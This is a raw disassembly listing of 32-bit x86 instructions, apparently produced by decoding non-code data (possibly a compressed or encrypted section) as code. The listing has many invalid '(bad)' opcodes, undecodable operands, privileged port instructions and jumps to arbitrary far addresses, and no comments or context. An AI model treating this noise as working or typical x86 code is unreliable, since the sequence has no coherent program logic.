  41cc8b:	mov    ebp,0x54bf7594
  41cc90:	or     eax,0x64483346
  41cc95:	imul   esp,DWORD PTR ds:0x293a4971,0x8233252d
  41cc9f:	mov    esi,0x30991ec5
  41cca4:	loope  0x41cc44
  41cca6:	adc    al,cl
  41cca8:	lods   al,BYTE PTR ds:[esi]
  41cca9:	pop    ds
  41ccaa:	jae    0x41ccc5
  41ccac:	adc    ebp,esi
  41ccae:	pop    ebx
  41ccaf:	cmp    eax,0x6ae084e6
  41ccb4:	mov    ecx,DWORD PTR [ebx]
  41ccb6:	and    al,0x51
  41ccb8:	sub    DWORD PTR [eax+0x5b],edx
  41ccbb:	dec    ecx
  41ccbc:	sub    ebp,edx
  41ccbe:	mov    ss,WORD PTR [esi+0x51]
  41ccc1:	int3   
  41ccc2:	and    eax,DWORD PTR [ebx-0x77c439bb]
  41ccc8:	fadd   QWORD PTR [edx+ecx*8-0x1a]
  41cccc:	std    
  41cccd:	xchg   esp,eax
  41ccce:	add    dh,BYTE PTR [ebp+0x6961dbfc]
  41ccd4:	and    DWORD PTR [esp+ebp*4],edx
  41ccd7:	outs   dx,BYTE PTR ds:[esi]
  41ccd8:	adc    al,0x52
  41ccda:	pop    esp
  41ccdb:	in     eax,dx
  41ccdc:	add    al,0x11
  41ccde:	sbb    eax,DWORD PTR [ebx+0x49]
  41cce1:	push   edi
  41cce2:	or     ebp,edx
  41cce4:	mov    cl,BYTE PTR [edi-0x3021379a]
  41ccea:	in     al,0xb7
  41ccec:	pop    ecx
  41cced:	and    edi,DWORD PTR [edx-0x7fe7903b]
  41ccf3:	mov    ds:0x6e18b347,al
  41ccf8:	pushf  
  41ccf9:	sbb    esi,DWORD PTR [edx-0x14d93b5]
  41ccff:	aad    0xa6
  41cd01:	ds ins DWORD PTR es:[edi],dx
  41cd03:	cli    
  41cd04:	cmp    eax,0x18c11d58
  41cd09:	mov    eax,ds:0x9de53b4d
  41cd0e:	or     edi,DWORD PTR [eax]
  41cd10:	inc    ecx
  41cd11:	mov    eax,0x7bb1352
  41cd16:	enter  0xbe4a,0x37
  41cd1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd1b:	in     al,dx
  41cd1c:	bound  ebx,QWORD PTR [ecx]
  41cd1e:	in     al,dx
  41cd1f:	fdivr  QWORD PTR [edi]
  41cd21:	pop    ebx
  41cd22:	mov    edi,0xf303d153
  41cd27:	mov    esi,0xa6a03660
  41cd2c:	es push edx
  41cd2e:	lahf   
  41cd2f:	cwde   
  41cd30:	fmulp  st(4),st
  41cd32:	mov    DWORD PTR [edi+0x5e],esi
  41cd35:	sub    eax,0x5383201e
  41cd3a:	mov    WORD PTR [edx+0x11],?
  41cd3d:	dec    eax
  41cd3e:	jmp    0xf109:0x947562a7
  41cd45:	scas   eax,DWORD PTR es:[edi]
  41cd46:	test   BYTE PTR [edi],bl
  41cd48:	and    eax,0x480ffd2f
  41cd4d:	sbb    eax,0xc8e81c1f
  41cd52:	ret    0x9e4a
  41cd55:	xchg   edi,eax
  41cd56:	(bad)  
  41cd57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd58:	mov    esi,0xe7a75d0e
  41cd5d:	(bad)  
  41cd5f:	xlat   BYTE PTR ds:[ebx]
  41cd60:	imul   sp,WORD PTR [ecx+0x2a],0xd2aa
  41cd66:	ret    0x215a
  41cd69:	xor    DWORD PTR [edx+0x59],edi
  41cd6c:	in     al,0x2f
  41cd6e:	or     BYTE PTR [edx-0x4d45ecb1],0xab
  41cd75:	jb     0x41cdf5
  41cd77:	xor    edi,ebx
  41cd79:	je     0x41cd09
  41cd7b:	xchg   BYTE PTR [ebp-0x4baa6bf9],bh
  41cd81:	push   es
  41cd82:	fistp  QWORD PTR [edi+0xab45c68]
  41cd88:	ret    0x5e55
  41cd8b:	scas   al,BYTE PTR es:[edi]
  41cd8c:	imul   esi,DWORD PTR [edi+0x2f84423],0x59
  41cd93:	xor    DWORD PTR [edx],edi
  41cd95:	inc    ebx
  41cd96:	add    eax,0xf4125cb4
  41cd9b:	pop    esi
  41cd9d:	repz mov ebx,0xb0666796
  41cda3:	inc    eax
  41cda4:	ins    DWORD PTR es:[edi],dx
  41cda5:	jg     0x41cd93
  41cda7:	adc    ah,BYTE PTR ss:[eax+0x3a]
  41cdab:	pop    ds
  41cdac:	icebp  
  41cdad:	push   edi
  41cdae:	sahf   
  41cdaf:	pop    esp
  41cdb0:	and    ecx,esp
  41cdb2:	jne    0x41cdd7
  41cdb4:	data16 jp 0x41cd94
  41cdb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdb8:	mov    edi,0x2b5341e9
  41cdbd:	fwait
  41cdbe:	cld    
  41cdbf:	jmp    0x592a:0xbe170d96
  41cdc6:	jg     0x41cde0
  41cdc8:	scas   al,BYTE PTR es:[edi]
  41cdc9:	adc    DWORD PTR [ecx-0x57],esp
  41cdcc:	cmp    al,0xaf
  41cdce:	push   eax
  41cdcf:	adc    eax,0xc5bb38a8
  41cdd4:	call   0x8a6e5b7d
  41cdd9:	cmc    
  41cdda:	fisub  DWORD PTR [edx]
  41cddc:	xor    ch,BYTE PTR [ecx]
  41cdde:	imul   ebx,DWORD PTR [esi+0x62988469],0xc3a30680
  41cde8:	add    al,0xe5
  41cdea:	jnp    0x41cdb5
  41cdec:	fild   DWORD PTR [edx+0x17]
  41cdef:	out    0xb8,eax
  41cdf1:	dec    ecx
  41cdf2:	loop   0x41cd94
  41cdf4:	jmp    0x4c36:0x19d36d1
  41cdfb:	shl    BYTE PTR ds:0x8b4c9f11,1
  41ce01:	hlt    
  41ce02:	inc    ebx
  41ce03:	popf   
  41ce04:	and    ecx,ebp
  41ce06:	push   ecx
  41ce07:	scas   eax,DWORD PTR es:[edi]
  41ce08:	mov    al,ds:0xd981b6
  41ce0d:	call   0x73cd27a0
  41ce12:	hlt    
  41ce13:	or     bl,BYTE PTR [ecx]
  41ce15:	dec    esi
  41ce16:	sbb    eax,0xa1bf3764
  41ce1b:	xchg   esp,eax
  41ce1c:	push   ecx
  41ce1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce1e:	mov    eax,DWORD PTR [eax]
  41ce20:	fdivr  QWORD PTR [eax+0x76]
  41ce23:	inc    esi
  41ce24:	and    al,0x14
  41ce26:	dec    esi
  41ce27:	mov    al,0x0
  41ce29:	xor    BYTE PTR [esi],bh
  41ce2b:	jns    0x41ce4c
  41ce2d:	inc    ecx
  41ce2e:	retf   0xbb11
  41ce31:	push   esi
  41ce32:	jg     0x41ce5c
  41ce34:	push   ebp
  41ce35:	js     0x41cdf2
  41ce37:	cmp    eax,0x6ec2ce9c
  41ce3c:	(bad)  
  41ce3e:	fstp   QWORD PTR [esi-0x51]
  41ce41:	cli    
  41ce42:	xchg   esi,eax
  41ce43:	mov    ebx,0xe9b8542
  41ce48:	je     0x41cdf4
  41ce4a:	int3   
  41ce4b:	and    BYTE PTR [eax],0x5e
  41ce4e:	and    al,bh
  41ce50:	ja     0x41ce4d
  41ce52:	mov    dh,0x13
  41ce54:	jb     0x41cec3
  41ce56:	fwait
  41ce57:	repz and DWORD PTR [ebx+ebp*4],edx
  41ce5b:	lds    edi,FWORD PTR [eax+ebx*1]
  41ce5e:	shl    DWORD PTR [ebx-0x4a514ae],1
  41ce64:	shr    BYTE PTR [ecx-0x43886a1a],cl
  41ce6a:	je     0x41ce7f
  41ce6c:	mov    esp,0x83b720e4
  41ce71:	mov    eax,ds:0xc59ea16d
  41ce76:	xchg   esi,eax
  41ce77:	jbe    0x41ce5b
  41ce79:	xor    bh,0xbd
  41ce7c:	mov    ?,esi
  41ce7e:	sahf   
  41ce7f:	gs enter 0x2302,0xcd
  41ce84:	ja     0x41ced2
  41ce86:	push   ebp
  41ce87:	adc    DWORD PTR [ebp-0x1cb39c96],esp
  41ce8d:	sar    BYTE PTR [ebx],cl
  41ce8f:	out    0x8e,eax
  41ce91:	push   ebp
  41ce92:	dec    esp
  41ce93:	test   DWORD PTR [ecx-0x53],0x889cfdf8
  41ce9a:	lods   eax,DWORD PTR ds:[esi]
  41ce9b:	add    eax,0xb5d44631
  41cea0:	adc    DWORD PTR [ecx],eax
  41cea2:	fnstenv [esi-0x7caacc9e]
  41cea8:	xchg   ecx,eax
  41cea9:	push   ebp
  41ceaa:	mov    ah,BYTE PTR [edi-0x62]
  41cead:	jne    0x41ce5b
  41ceaf:	or     BYTE PTR [esi+0x360b6b6e],cl
  41ceb5:	daa    
  41ceb6:	mov    esp,0x874e7c5d
  41cebb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cebc:	pop    esi
  41cebd:	inc    esp
  41cebe:	dec    BYTE PTR ds:0x48bc4a5e
  41cec4:	nop
  41cec5:	mov    bl,0xcf
  41cec7:	sbb    al,0x84
  41cec9:	xchg   esp,eax
  41ceca:	cs push edx
  41cecc:	sbb    eax,0xa4d50eb9
  41ced1:	add    al,0x3d
  41ced3:	or     eax,edx
  41ced5:	xor    ah,al
  41ced7:	pushf  
  41ced8:	sub    eax,0x728c9f85
  41cedd:	int3   
  41cede:	mov    ch,0x98
  41cee0:	and    edx,DWORD PTR [eax-0x20]
  41cee3:	(bad)
  41cee9:	jge    0x41ced1
  41ceeb:	int    0xe1
  41ceed:	or     al,0x1c
  41ceef:	imul   edi,DWORD PTR [ebx-0x45554387],0xb2fa5340
  41cef9:	call   0x82a6a291
  41cefe:	icebp  
  41ceff:	pop    edx
  41cf00:	mov    eax,ds:0x95215bc9
  41cf05:	inc    esp
  41cf06:	icebp  
  41cf07:	inc    ebp
  41cf08:	enter  0xc6e8,0x2f
  41cf0c:	sbb    eax,0xdf3d66c4
  41cf11:	mov    ebx,0x45535608
  41cf16:	mov    DWORD PTR [ecx+0x6b],esi
  41cf19:	ja     0x41cf34
  41cf1b:	pop    ebp
  41cf1c:	aam    0x32
  41cf1e:	loopne 0x41cee6
  41cf20:	sbb    DWORD PTR [ebp+0x134cf151],ebx
  41cf26:	jp     0x41cece
  41cf28:	rcl    BYTE PTR [ebx-0x365898ff],cl
  41cf2e:	dec    ecx
  41cf2f:	mov    dl,0x64
  41cf31:	std    
  41cf32:	repz sbb al,0x72
  41cf35:	das    
  41cf36:	mov    ebp,0x878939c8
  41cf3b:	nop
  41cf3c:	or     eax,0xdd492e83
  41cf41:	icebp  
  41cf42:	fbstp  TBYTE PTR [edx]
  41cf44:	pop    ebp
  41cf45:	adc    eax,0x1425f165
  41cf4a:	cmc    
  41cf4b:	fwait
  41cf4c:	call   0xa0c0:0xd8825861
  41cf53:	pop    ss
  41cf54:	jp     0x41cf09
  41cf56:	add    DWORD PTR [edx+0x3a],esi
  41cf59:	cld    
  41cf5a:	xchg   edi,eax
  41cf5b:	ss xchg edi,eax
  41cf5d:	pop    ecx
  41cf5e:	push   ss
  41cf5f:	cld    
  41cf60:	sbb    BYTE PTR [eax-0xa],cl
  41cf63:	jecxz  0x41cf67
  41cf65:	jle    0x41cf98
  41cf67:	xchg   esi,eax
  41cf68:	sti    
  41cf69:	outs   dx,BYTE PTR ds:[esi]
  41cf6a:	loop   0x41cefe
  41cf6c:	or     DWORD PTR [edx-0x38d8713c],ecx
  41cf72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf73:	mov    cl,0x3a
  41cf75:	push   ss
  41cf76:	arpl   WORD PTR [edx-0x6d],sp
  41cf79:	imul   ecx,DWORD PTR [edi-0x52],0xf1eacddc
  41cf80:	pop    esp
  41cf81:	push   cs
  41cf82:	cmp    cl,0x6
  41cf85:	int3   
  41cf86:	push   ss
  41cf87:	cmp    ebx,DWORD PTR [edi]
  41cf89:	fisubr DWORD PTR [esi+0x773349d7]
  41cf8f:	(bad)  
  41cf90:	addr16 push ebx
  41cf92:	pushf  
  41cf93:	fist   WORD PTR [ecx]
  41cf95:	inc    edx
  41cf96:	test   BYTE PTR [edi-0x34b77a78],bh
  41cf9c:	retf   0x8778
  41cf9f:	repnz (bad) 
  41cfa1:	mov    dl,0x68
  41cfa3:	push   ss
  41cfa4:	mov    eax,ds:0xc3fdc030
  41cfa9:	dec    ebp
  41cfaa:	inc    edx
  41cfab:	lods   al,BYTE PTR ds:[esi]
  41cfac:	mov    cl,BYTE PTR [esi-0x2ce22ffa]
  41cfb2:	cmp    al,0x60
  41cfb4:	mov    ds:0xd5092fba,al
  41cfba:	push   esi
  41cfbb:	frstor [edx+0x23]
  41cfbe:	mov    ch,0xaf
  41cfc0:	in     eax,0xef
  41cfc2:	(bad)  
  41cfc3:	adc    DWORD PTR [esi+0x47],ebp
  41cfc6:	xchg   ebx,eax
  41cfc7:	mov    BYTE PTR [edi+0x4beff61d],0x89
  41cfce:	add    al,0x6f
  41cfd0:	(bad)  
  41cfd2:	push   ds
  41cfd3:	aaa    
  41cfd4:	dec    ebp
  41cfd5:	xor    DWORD PTR [ecx],0x55
  41cfd8:	bound  ebp,QWORD PTR ds:0xe0f40e42
  41cfde:	popf   
  41cfdf:	cmp    BYTE PTR [ecx],dl
  41cfe1:	lods   eax,DWORD PTR ds:[esi]
  41cfe2:	dec    eax
  41cfe3:	jmp    0x954a82fe
  41cfe8:	scas   al,BYTE PTR es:[edi]
  41cfe9:	int3   
  41cfea:	lea    esp,[eax+ecx*4+0x69]
  41cfee:	dec    edi
  41cfef:	pop    esp
  41cff0:	mov    ecx,0x561e75ec
  41cff5:	push   ebp
  41cff6:	xlat   BYTE PTR ds:[ebx]
  41cff7:	cdq    
  41cff8:	and    al,0xcd
  41cffa:	jbe    0x41cfa7
  41cffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cffd:	sbb    dh,BYTE PTR ds:0xc7c22219
  41d003:	lock and BYTE PTR [eax-0x7d863c9a],dh
  41d00a:	sub    esi,esi
  41d00c:	cmp    bh,BYTE PTR [esp+ebp*1+0x4e]
  41d010:	lods   al,BYTE PTR ds:[esi]
  41d011:	mov    ecx,ss
  41d013:	das    
  41d014:	inc    ax
  41d016:	daa    
  41d017:	and    eax,0xe83de8de
  41d01c:	sbb    eax,0x5dd2d65b
  41d021:	repnz inc ebx
  41d023:	cmp    edx,edx
  41d025:	mov    dh,0xcb
  41d027:	aas    
  41d028:	les    ecx,FWORD PTR [ecx+0x15]
  41d02b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d02c:	dec    eax
  41d02d:	in     eax,dx
  41d02e:	mov    ah,0x7e
  41d030:	ins    DWORD PTR es:[edi],dx
  41d031:	add    BYTE PTR [ebp-0x6d8d4100],dh
  41d037:	(bad)  
  41d038:	sbb    ebp,DWORD PTR [ebx]
  41d03a:	mov    ch,ah
  41d03c:	mov    edi,0x8441ab6
  41d041:	push   eax
  41d042:	aaa    
  41d043:	mov    ds:0x8be3fe84,eax
  41d048:	inc    ebp
  41d049:	in     al,dx
  41d04a:	mov    DWORD PTR [eax],0x657664e9
  41d050:	mov    DWORD PTR [eax+0x4],0x86787677
  41d057:	jmp    0x41f3bf
  41d05c:	sahf   
  41d05d:	aas    
  41d05e:	mov    ah,0xab
  41d060:	je     0x41d0d2
  41d062:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d063:	dec    esi
  41d064:	sbb    bl,BYTE PTR [eax+0x256cfe60]
  41d06a:	mov    ebp,0x7a23e9cc
  41d06f:	jnp    0x41d031
  41d071:	cwde   
  41d072:	jnp    0x41d0ef
  41d074:	add    al,0xd3
  41d076:	ins    DWORD PTR es:[edi],dx
  41d077:	push   ebx
  41d078:	sbb    eax,0x6ff14de1
  41d07d:	jns    0x41d026
  41d07f:	fmul   st,st(0)
  41d081:	and    bh,BYTE PTR [ebx]
  41d083:	popa   
  41d084:	cmp    BYTE PTR [ebp+0x61b611b7],al
  41d08a:	sub    ecx,edi
  41d08c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d08d:	xor    dl,bh
  41d08f:	(bad)  
  41d090:	imul   eax,DWORD PTR [esi+0x616c2f9f],0x4d
  41d097:	dec    eax
  41d098:	cmp    ebx,ebx
  41d09a:	stos   DWORD PTR es:[edi],eax
  41d09b:	inc    edi
  41d09c:	out    0xf3,eax
  41d09e:	jmp    0x41d053
  41d0a0:	pop    ecx
  41d0a1:	xchg   edi,eax
  41d0a2:	xchg   ebx,eax
  41d0a3:	bound  eax,QWORD PTR [edi-0x6d]
  41d0a6:	fst    DWORD PTR [edi-0x76d3d493]
  41d0ac:	pop    ds
  41d0ad:	or     DWORD PTR [ecx-0x34c2ca0],edi
  41d0b3:	in     al,0x68
  41d0b5:	push   cs
  41d0b6:	sub    DWORD PTR [edi],ebx
  41d0b8:	stos   BYTE PTR es:[edi],al
  41d0b9:	mov    WORD PTR [eax+0x136d1df9],es
  41d0bf:	clc    
  41d0c0:	push   cs
  41d0c1:	daa    
  41d0c2:	scas   eax,DWORD PTR es:[edi]
  41d0c3:	int3   
  41d0c4:	adc    edi,DWORD PTR [ebp+0x20d25b86]
  41d0ca:	repnz sbb BYTE PTR [edi],0xa7
  41d0ce:	iret   
  41d0cf:	cmc    
  41d0d0:	ret    0xd38
  41d0d3:	mov    ds:0x2b81da9,al
  41d0d8:	mov    bl,0xc0
  41d0da:	call   0xfb23d75
  41d0df:	xor    bh,BYTE PTR [eax-0x2a]
  41d0e2:	pusha  
  41d0e3:	push   ds
  41d0e4:	das    
  41d0e5:	repz test dl,bl
  41d0e8:	test   al,0xc9
  41d0ea:	sbb    eax,0x8865c336
  41d0ef:	les    ebp,FWORD PTR [ecx]
  41d0f1:	leave  
  41d0f2:	mov    cl,bl
  41d0f4:	sub    DWORD PTR [edi-0x17],ebx
  41d0f7:	adc    ebp,DWORD PTR [ebp+eax*1-0x16]
  41d0fb:	hlt    
  41d0fc:	jne    0x41d12f
  41d0fe:	inc    ebp
  41d0ff:	in     eax,dx
  41d100:	shr    BYTE PTR [edi-0x73cba361],1
  41d106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d107:	dec    ecx
  41d108:	push   esi
  41d109:	jb     0x41d091
  41d10b:	add    BYTE PTR [ecx],0xdc
  41d10e:	push   edi
  41d10f:	inc    edi
  41d110:	mov    ebx,0xa5776216
  41d115:	inc    esp
  41d116:	push   ebp
  41d117:	inc    edx
  41d118:	xchg   ebx,eax
  41d119:	cmp    dh,bl
  41d11b:	push   ebp
  41d11c:	jmp    0x6ead3915
  41d121:	adc    DWORD PTR [ebp-0x1c50dab9],ebx
  41d127:	mov    dh,0xad
  41d129:	cmp    BYTE PTR [eiz*2+0x4fced606],bl
  41d130:	bound  esp,QWORD PTR [edi-0x57]
  41d133:	xchg   esi,eax
  41d134:	push   edx
  41d135:	pop    ds
  41d136:	or     ebp,esi
  41d138:	mov    al,ds:0xbf5e5a1a
  41d13d:	sub    ah,ch
  41d13f:	sbb    ebp,DWORD PTR ds:0xf7579749
  41d145:	retf   
  41d146:	fwait
  41d147:	inc    eax
  41d148:	test   BYTE PTR [ecx+0x493be506],0x82
  41d14f:	xor    ah,BYTE PTR fs:[edi-0x5a]
  41d153:	xchg   esi,eax
  41d154:	sti    
  41d155:	stc    
  41d156:	lods   eax,DWORD PTR ds:[esi]
  41d157:	jno    0x41d14c
  41d159:	in     eax,dx
  41d15a:	(bad)  
  41d15b:	lock or eax,DWORD PTR [ecx+0x57]
  41d15f:	leave  
  41d160:	(bad)  
  41d162:	fwait
  41d163:	dec    ebx
  41d164:	xlat   BYTE PTR ds:[ebx]
  41d165:	pop    eax
  41d166:	lods   al,BYTE PTR ds:[esi]
  41d167:	or     eax,0x82671b58
  41d16c:	mov    DWORD PTR [edx+0x39],0x11abd076
  41d173:	dec    bp
  41d175:	sub    ebx,DWORD PTR [ecx+0x31]
  41d178:	mov    ah,0x46
  41d17a:	pop    edi
  41d17b:	(bad)  
  41d17c:	ins    DWORD PTR es:[edi],dx
  41d17d:	mov    eax,ds:0xf7ca0620
  41d182:	leave  
  41d183:	(bad)  
  41d184:	int3   
  41d185:	mov    DWORD PTR [esi-0x60],ecx
  41d188:	or     edi,ebp
  41d18a:	cli    
  41d18b:	hlt    
  41d18c:	popf   
  41d18d:	xor    eax,0x9d4570c6
  41d192:	xor    eax,0xb4e74f33
  41d197:	pop    es
  41d198:	int    0x86
  41d19a:	pop    ecx
  41d19b:	adc    BYTE PTR [edx-0x2b],0x38
  41d19f:	or     al,0xd0
  41d1a1:	cdq    
  41d1a2:	xor    al,0xb5
  41d1a4:	mov    eax,0x5ccf924f
  41d1a9:	mov    esp,0x2f168b2c
  41d1ae:	adc    DWORD PTR [ebp-0x5d4f767e],0x53
  41d1b5:	fsubr  DWORD PTR [esi]
  41d1b7:	sub    dh,dl
  41d1b9:	outs   dx,BYTE PTR ds:[esi]
  41d1ba:	fimul  WORD PTR [ecx-0x505dcd56]
  41d1c0:	inc    ebx
  41d1c1:	add    DWORD PTR [ebx+0xb],0x15c1a526
  41d1c8:	push   ebp
  41d1c9:	repnz and DWORD PTR [ebp+0x10],edx
  41d1cd:	mov    esi,esp
  41d1cf:	lock add edi,esp
  41d1d2:	(bad)  
  41d1d3:	sti    
  41d1d4:	inc    esi
  41d1d5:	push   esp
  41d1d6:	(bad)  
  41d1d7:	adc    eax,ebp
  41d1d9:	std    
  41d1da:	mov    al,ds:0x670f9992
  41d1df:	cdq    
  41d1e0:	cmp    edi,esi
  41d1e2:	dec    esi
  41d1e3:	icebp  
  41d1e4:	leave  
  41d1e5:	pop    eax
  41d1e6:	enter  0x96af,0xb0
  41d1ea:	pop    edi
  41d1eb:	push   ebp
  41d1ec:	mov    bh,0x89
  41d1ee:	mov    ebp,0xb24e6ae3
  41d1f3:	aad    0x60
  41d1f5:	mov    esp,0xaaddbbd6
  41d1fa:	cli    
  41d1fb:	jne    0x41d1c0
  41d1fd:	ficom  DWORD PTR [ecx+ebx*4-0x30771457]
  41d204:	icebp  
  41d205:	out    0x4c,al
  41d207:	and    DWORD PTR ds:0xdfb41fac,esi
  41d20d:	xor    DWORD PTR [esi+0x7d],ebx
  41d210:	push   ds
  41d211:	cld    
  41d212:	sti    
  41d213:	fwait
  41d214:	and    BYTE PTR [ebx+0x7c],dl
  41d217:	int3   
  41d218:	inc    esp
  41d219:	push   0x9c56e6a
  41d21e:	imul   esi,DWORD PTR [edx+0x35ebc5e9],0x2c9accd0
  41d228:	imul   esi,esp,0xffffffd9
  41d22b:	call   FWORD PTR [esi]
  41d22d:	jnp    0x41d247
  41d22f:	imul   DWORD PTR [ecx-0x4edcf95]
  41d235:	or     eax,0xdaa9dc8a
  41d23a:	mov    BYTE PTR [eax-0x747b7a93],bl
  41d240:	std    
  41d241:	mov    ds:0x35495c85,al
  41d246:	mov    eax,ds:0x34a2c062
  41d24b:	out    dx,eax
  41d24c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d24d:	mov    edi,0xd935a838
  41d252:	and    cl,dh
  41d254:	retf   0xf627
  41d257:	jns    0x41d2a3
  41d259:	mov    edx,0xd93eef84
  41d25e:	(bad)  
  41d260:	sti    
  41d261:	xor    ebx,eax
  41d263:	enter  0xbac8,0xab
  41d267:	ror    BYTE PTR [edx+0x3925685f],cl
  41d26d:	mov    WORD PTR [esi],gs
  41d26f:	fstp   QWORD PTR [edi-0x470b0f89]
  41d275:	pop    esi
  41d276:	mov    BYTE PTR [edi+0x7afa9996],dh
  41d27c:	leave  
  41d27d:	je     0x41d232
  41d27f:	cmp    eax,0xb8147128
  41d284:	jno    0x41d23c
  41d286:	xchg   ebp,eax
  41d287:	out    dx,eax
  41d288:	inc    eax
  41d289:	ja     0x41d2d6
  41d28b:	push   esp
  41d28c:	pushf  
  41d28d:	out    0xd2,al
  41d28f:	arpl   WORD PTR [ecx],cx
  41d291:	jb     0x41d2b0
  41d293:	in     eax,0x2b
  41d295:	mov    ss,WORD PTR [edx+0x2d]
  41d298:	push   ebx
  41d299:	cmp    cl,BYTE PTR [eax+0x6cb9c9f9]
  41d29f:	in     al,dx
  41d2a0:	push   edi
  41d2a1:	push   cs
  41d2a2:	mov    ah,0x17
  41d2a4:	je     0x41d2eb
  41d2a6:	mov    al,ds:0x8de6412c
  41d2ab:	xlat   BYTE PTR ds:[ebx]
  41d2ac:	es cli 
  41d2ae:	sbb    DWORD PTR ds:0x77b508d4,esp
  41d2b4:	or     ecx,DWORD PTR [ecx]
  41d2b6:	sub    bh,BYTE PTR [ebp+0x3403cb76]
  41d2bc:	es inc ebp
  41d2be:	retf   
  41d2bf:	add    DWORD PTR gs:[ebp-0x1],0xfffe5ac1
  41d2c7:	ds push 0x3e
  41d2ca:	push   eax
  41d2cb:	int3   
  41d2cc:	push   ebx
  41d2cd:	jp     0x41d289
  41d2cf:	shr    DWORD PTR es:[eax],1
  41d2d2:	adc    cl,BYTE PTR [edx-0x6b85b815]
  41d2d8:	mov    eax,ds
  41d2da:	into   
  41d2db:	hlt    
  41d2dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2dd:	add    eax,0xd206b5a5
  41d2e2:	cwde   
  41d2e3:	xor    DWORD PTR [esp-0x25],0x5de95b24
  41d2eb:	std    
  41d2ec:	mov    fs,WORD PTR [esi]
  41d2ee:	mov    ch,0xb9
  41d2f0:	adc    al,0x34
  41d2f2:	sbb    al,0x61
  41d2f4:	dec    edi
  41d2f5:	(bad)  
  41d2f6:	pop    ecx
  41d2f7:	adc    cl,BYTE PTR [ecx]
  41d2f9:	xchg   ebx,eax
  41d2fa:	cs cdq 
  41d2fc:	call   0x6733:0xa9828dff
  41d303:	mov    ah,0x3a
  41d305:	loope  0x41d35a
  41d307:	mov    eax,0x6394789f
  41d30c:	push   ebp
  41d30d:	and    al,0x20
  41d30f:	sub    dl,BYTE PTR [ecx]
  41d311:	xchg   DWORD PTR [ebp+0x1],ebx
  41d314:	sbb    al,0xc8
  41d316:	dec    edx
  41d317:	lahf   
  41d318:	popf   
  41d319:	push   ebx
  41d31a:	call   0x8364:0xf19eaf18
  41d321:	and    esi,eax
  41d323:	mov    eax,ds:0x19f4fdfb
  41d328:	xlat   BYTE PTR ds:[ebx]
  41d329:	sbb    BYTE PTR [edi+0x61],dl
  41d32c:	inc    ebp
  41d32d:	test   DWORD PTR [ecx+0x1813ee76],esp
  41d333:	scas   eax,DWORD PTR es:[edi]
  41d334:	loope  0x41d376
  41d336:	mov    edi,0x105f01e0
  41d33b:	dec    esp
  41d33c:	sbb    eax,0x7f2976d1
  41d341:	or     DWORD PTR [esi+0x7084de61],ebp
  41d347:	pop    esi
  41d348:	js     0x41d38e
  41d34a:	in     al,dx
  41d34b:	sar    BYTE PTR [ecx+0x6f],cl
  41d34e:	call   0x9281:0x553893ae
  41d355:	daa    
  41d356:	push   ds
  41d357:	pop    ebp
  41d358:	pop    esp
  41d359:	inc    esi
  41d35a:	test   BYTE PTR [eax+eiz*1],dh
  41d35d:	fst    st(7)
  41d35f:	jl     0x41d38e
  41d361:	sbb    eax,0xdc4e207b
  41d366:	retf   
  41d367:	mov    bh,0x11
  41d369:	(bad)  
  41d36a:	lahf   
  41d36b:	in     al,dx
  41d36c:	mov    bl,0x29
  41d36e:	rcr    BYTE PTR [eax-0x4cd5ca24],1
  41d374:	int3   
  41d375:	xchg   edx,eax
  41d376:	dec    edx
  41d377:	les    esi,FWORD PTR [ecx+0x7509c976]
  41d37d:	sub    ch,BYTE PTR [ebx+edi*1-0x667351e9]
  41d384:	jl     0x41d390
  41d386:	retf   
  41d387:	rcr    BYTE PTR [edx-0x10f6cb95],0x69
  41d38e:	ja     0x41d3aa
  41d390:	outs   dx,DWORD PTR ds:[esi]
  41d391:	(bad)  
  41d392:	stc    
  41d393:	std    
  41d394:	in     eax,0x13
  41d396:	mov    dl,0xb1
  41d398:	xchg   ecx,eax
  41d399:	sahf   
  41d39a:	(bad)  [esi+ebx*8]
  41d39d:	sti    
  41d39e:	jmp    0xbc58:0xb96c178c
  41d3a5:	jle    0x80f3c616
  41d3ab:	and    BYTE PTR [ecx],ah
  41d3ad:	jecxz  0x41d393
  41d3af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3b0:	int    0xf
  41d3b2:	lods   eax,DWORD PTR ds:[esi]
  41d3b3:	js     0x41d399
  41d3b5:	pop    ebp
  41d3b6:	sar    DWORD PTR [edi+edx*1+0x79],0xd5
  41d3bb:	inc    edx
  41d3bc:	(bad)  
  41d3bd:	mov    ecx,0xbb40dc26
  41d3c2:	push   eax
  41d3c3:	jbe    0x41d368
  41d3c5:	xchg   DWORD PTR [edx-0x30],esi
  41d3c8:	fcomi  st,st(6)
  41d3ca:	sahf   
  41d3cb:	int3   
  41d3cc:	imul   BYTE PTR [ebx+eax*4]
  41d3cf:	repnz adc eax,0x72c6fbd3
  41d3d5:	adc    dl,bh
  41d3d7:	push   cs
  41d3d8:	jns    0x41d40a
  41d3da:	mov    cl,0xaf
  41d3dc:	dec    ebx
  41d3dd:	xchg   esp,eax
  41d3de:	aas    
  41d3df:	in     al,0x71
  41d3e1:	cwde   
  41d3e2:	arpl   WORD PTR [ecx-0x19ad4ad9],dx
  41d3e8:	xchg   edi,edi
  41d3ea:	pop    eax
  41d3eb:	jg     0x41d38f
  41d3ed:	leave  
  41d3ee:	int    0x49
  41d3f0:	inc    ebx
  41d3f1:	pop    ebp
  41d3f2:	cmc    
  41d3f3:	mov    ds:0x2b74c024,eax
  41d3f8:	or     ah,bl
  41d3fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3fb:	ficomp DWORD PTR [ebx]
  41d3fd:	jo     0x41d381
  41d3ff:	mov    ebx,ds
  41d401:	add    dl,BYTE PTR [ebx+0xf1ebace]
  41d407:	push   ebp
